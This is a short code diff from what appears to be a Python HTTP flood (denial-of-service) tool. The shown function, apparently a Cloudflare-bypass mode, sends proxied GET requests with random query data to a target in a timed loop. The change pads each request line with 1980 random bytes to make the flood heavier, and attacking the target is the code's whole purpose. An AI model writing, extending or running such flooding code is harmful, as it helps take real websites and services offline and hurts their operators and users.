@@ -462,7 +462,7 @@ def cookie(event, socks_type):
 def cfb(event, socks_type):
     header = Headers("get")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?" + random_data() + str(random._urandom(1980)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
